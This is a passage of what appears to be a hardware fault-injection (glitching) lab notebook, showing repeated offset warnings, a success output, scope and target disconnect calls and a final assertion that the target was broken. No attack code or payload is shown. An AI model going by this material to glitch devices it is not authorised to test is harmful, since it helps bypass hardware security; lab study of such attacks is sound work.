    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    




.. parsed-literal::

    CWbytearray(b'01')
    48.828125 -47.65625 17
    🐙




.. parsed-literal::

    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    



**In [11]:**

.. code:: ipython3

    scope.dis()
    target.dis()


**In [12]:**

.. code:: ipython3

    assert broken is True
